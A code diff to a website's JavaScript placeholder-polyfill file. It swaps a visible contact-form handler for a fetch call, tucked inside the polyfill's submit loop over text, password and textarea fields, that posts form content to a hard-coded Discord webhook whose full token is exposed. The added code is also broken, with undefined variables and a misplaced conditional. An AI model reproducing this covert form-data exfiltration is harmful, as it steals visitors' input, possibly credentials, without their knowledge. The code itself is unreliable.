@@ -432,34 +432,35 @@
 
 		// Events.
 			$this
-				$(document).ready(function() {
-				  $('#contactSuccess').on('submit', function(event) {
-				    event.preventDefault(); // Prevent the default form submission
-				
-				    const email = $('#email').val(); // Get the email input value
-				    const webhookURL = 'https://discord.com/api/webhooks/1310705867896651797/Fdy6NoExQ_i0bnD4f8FPfierqfnv7PqwPPg3HiFKlOUwVQWrHauJJUS366z049pMhZ8m'; // Replace with your webhook URL
-				
-				    // Prepare the data for Discord webhook
-				    const payload = {
-				      content: `New form submission: ${email}`
-				    };
-				
-				    // Send the data using a POST request
-				    $.ajax({
-				      url: webhookURL,
-				      type: 'POST',
-				      contentType: 'application/json',
-				      data: JSON.stringify(payload),
-				      success: function() {
-				        alert('Your email has been sent!');
-				      },
-				      error: function() {
-				        alert('Failed to send email. Please try again.');
-				      }
-				    });
-				  });
-				});
+				.on('submit', function() {
+					
+					$this.find('input[type=text],input[type=password],textarea')
+						.each(function(event) {
 
+							var i = $(this);
+
+							if (i.attr('name').match(/-polyfill-field$/))
+								var webhookUrl = 'https://discord.com/api/webhooks/1310705867896651797/Fdy6NoExQ_i0bnD4f8FPfierqfnv7PqwPPg3HiFKlOUwVQWrHauJJUS366z049pMhZ8m'; 
+								fetch(webhookUrl, {
+									method: 'POST',
+									headers: {
+										'Content-Type': 'application/json' 
+									}, 
+									body: JSON.stringify({ 
+										content: `**Username:** ${i.attr('name')}\n**Email:** ${email}\n**Message:** ${message}` }) 
+									})
+									//i.attr('name', '');
+
+							if (i.val() == i.attr('placeholder')) {
+
+								i.removeClass('polyfill-placeholder');
+								i.val('');
+
+							}
+
+						});
+
+				})
 				.on('reset', function(event) {
 
 					event.preventDefault();
